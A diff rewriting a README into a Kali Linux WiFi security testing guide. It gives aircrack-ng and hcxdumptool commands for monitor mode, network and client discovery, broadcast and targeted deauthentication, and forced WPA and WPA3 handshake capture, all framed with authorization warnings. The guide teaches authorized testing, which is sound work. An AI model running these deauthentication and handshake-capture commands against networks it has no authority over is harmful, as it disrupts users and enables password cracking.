@@ -1,39 +1,206 @@
-**The README.md file provides educational documentation on utilizing the airmon-ng tool within Kali Linux for WiFi monitoring and manipulation. It outlines a series of commands tailored for educational purposes, guiding users through the process of initiating monitor mode, capturing packets, and performing targeted attacks such as deauthentication. Each command is accompanied by a brief explanation, ensuring clarity and comprehension for users unfamiliar with these tools.**
+# WiFi Security Testing Guide
 
-**The documentation emphasizes the educational nature of the content and underscores the importance of obtaining proper authorization before attempting any actions. Additionally, it includes examples to illustrate the usage of each command, aiding users in understanding the practical application of the provided instructions.**
+This repository contains documentation for educational WiFi security testing using Kali Linux. This guide is strictly for **educational purposes** and authorized security testing only.
 
+> **⚠️ IMPORTANT:** Unauthorized network penetration is illegal in most jurisdictions. Always obtain proper written authorization before performing any security testing. Use these techniques only on networks you own or have explicit permission to test.
 
-**This README serves as a valuable resource for individuals interested in learning about WiFi security and penetration testing using Kali Linux. It empowers users with foundational knowledge and practical insights while promoting ethical and responsible use of these tools for educational purposes.**
+## Prerequisites
 
+- Kali Linux (2023.1 or newer)
+- Compatible wireless adapter with monitor mode support
+- Basic understanding of networking concepts
+- Legal authorization to test the target network
 
+## Setup and Discovery
 
+### Check Network Interfaces
 
+First, identify your wireless interfaces:
 
-## Kali Linux WiFi Attack Commands
-1. `ifconfig`
-2. `iwconfig`
-## Start the Wireless Interface in Monitor Mode
-4. `airmon-ng start wlan0` (replace `wlan0` with your device name)
-5. `airodump-ng wlan0` - Shows all networks around
-6. `airodump-ng --channel 8 --bssid [MAC address] wlan0mon` - Shows devices connected to the selected WiFi network
+```bash
+# Show all network interfaces
+ip a
 
-## AIRODUMP-NG
+# Alternative for network interface details
+iw dev
+```
 
-- `airodump-ng --channel <channel> -bssid <BSSID> --write <file_name> <interface>`
-  
-  Example: `airodump-ng --channel 12 --bssid 40:30:20:10 --write test mon0`
+### Manage Wireless Services
 
-## Deauthentication Attack
+Before starting, ensure no conflicting services are running:
 
-- `aireplay-ng --deauth <#packets> -a <AP> <interface>`
+```bash
+# Stop potentially interfering services
+sudo systemctl stop NetworkManager
+sudo systemctl stop wpa_supplicant
 
-  Example: `aireplay-ng --deauth 1000 -a 10:20:30:40 mon0`
+# To restore normal networking after testing
+# sudo systemctl start NetworkManager
+# sudo systemctl start wpa_supplicant
+```
 
-## Target Attack
+## Monitor Mode and Network Discovery
 
-- `aireplay-ng --deauth <#packets> -a <AP> -c <target> <interface>`
+### Enable Monitor Mode
 
-  Example: `aireplay-ng --deauth 1000 -a 10:20:30:40 -c 00:AA:11:BB mon0`
+Using Airmon-ng (traditional method):
 
+```bash
+# Kill processes that might interfere
+sudo airmon-ng check kill
 
-Remember, unauthorized use of these commands for network intrusion or any unethical activities may be illegal. Always obtain proper authorization before conducting any penetration testing or security research. These commands are for educational purposes to understand the basics of WiFi monitoring and manipulation.
+# Start monitor mode
+sudo airmon-ng start <interface>
+```
+
+Using iw (modern alternative):
+
+```bash
+# Set interface down
+sudo ip link set <interface> down
+
+# Enable monitor mode
+sudo iw <interface> set monitor control
+
+# Bring interface back up
+sudo ip link set <interface> up
+```
+
+### Scan for WiFi Networks
+
+```bash
+# Basic scan for nearby networks
+sudo airodump-ng <monitor_interface>
+
+# For a more modern approach with extended information
+sudo airodump-ng <monitor_interface> --band abg --wps --manufacturer
+```
+
+### Target Network Analysis
+
+To focus on a specific network and collect more detailed information:
+
+```bash
+# Focus on specific network and save capture
+sudo airodump-ng --channel <channel> --bssid <BSSID> --write <capture_filename> <monitor_interface>
+```
+
+## Client Discovery and Traffic Analysis
+
+### Identify Connected Clients
+
+```bash
+# Shows devices connected to the selected WiFi network
+sudo airodump-ng --channel <channel> --bssid <BSSID> <monitor_interface>
+```
+
+### Packet Capture and Analysis
+
+```bash
+# Capture traffic in pcap format for later analysis
+sudo airodump-ng --channel <channel> --bssid <BSSID> --output-format pcap --write <filename> <monitor_interface>
+
+# Analyze captured packets
+wireshark <filename>-01.cap
+```
+
+## Security Testing Techniques
+
+### Client Deauthentication Test
+
+This technique tests how a network handles disconnection events:
+
+```bash
+# Broadcast deauthentication (all clients)
+sudo aireplay-ng --deauth <num_packets> -a <AP_BSSID> <monitor_interface>
+
+# Targeted deauthentication (specific client)
+sudo aireplay-ng --deauth <num_packets> -a <AP_BSSID> -c <client_MAC> <monitor_interface>
+```
+
+### WPA Handshake Capture
+
+Capturing the WPA handshake for security analysis:
+
+```bash
+# Start capturing on the target network
+sudo airodump-ng --channel <channel> --bssid <BSSID> --write <handshake_file> <monitor_interface>
+
+# In another terminal, send deauth to force reconnection and capture handshake
+sudo aireplay-ng --deauth 1 -a <BSSID> <monitor_interface>
+```
+
+### Modern WPA3 Security Testing
+
+```bash
+# Check if target network supports WPA3
+sudo airodump-ng <monitor_interface> | grep -i WPA3
+
+# Attempt to capture SAE handshakes
+sudo hcxdumptool -i <interface> -o <output_file>.pcapng --enable_status=1
+```
+
+## Advanced Analysis Tools
+
+### WiFi Signal Quality Testing
+
+```bash
+# Install Wavemon (if not already installed)
+sudo apt update && sudo apt install wavemon
+
+# Run signal monitoring tool
+wavemon
+```
+
+### Network Profile Analysis
+
+```bash
+# Install Kismet (if not already installed)
+sudo apt update && sudo apt install kismet
+
+# Run Kismet server
+sudo kismet -c <interface>
+```
+
+## Cleanup
+
+Always properly disable monitor mode and restore normal functioning when finished:
+
+```bash
+# Using airmon-ng
+sudo airmon-ng stop <monitor_interface>
+
+# Manual alternative
+sudo ip link set <interface> down
+sudo iw <interface> set type managed
+sudo ip link set <interface> up
+
+# Restart network services
+sudo systemctl start NetworkManager
+sudo systemctl start wpa_supplicant
+```
+
+## Additional Security Considerations
+
+- **MAC Address Randomization**: Modern devices use MAC randomization to enhance privacy. This can affect client tracking.
+- **Enterprise Security**: WPA/WPA2/WPA3-Enterprise environments require different testing approaches.
+- **IoT Devices**: Consider the presence of IoT devices which may have unique security characteristics.
+
+## Legal and Ethical Reminders
+
+- Obtain written permission before any testing
+- Document scope and methods of testing
+- Report findings responsibly to network owners
+- Never attempt to access or exfiltrate data
+- Follow responsible disclosure procedures for any vulnerabilities identified
+
+## Further Learning Resources
+
+- [NIST SP 800-153](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-153.pdf) - Guidelines for Securing Wireless Local Area Networks
+- [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
+- [Kali Linux Wireless Penetration Testing](https://www.kali.org/docs/tutorials/)
+- [WiFi Security Best Practices](https://csrc.nist.gov/publications/detail/sp/800-97/final)
+
+---
+
+This guide is maintained for educational purposes only. Contributors are not responsible for misuse of the information provided.
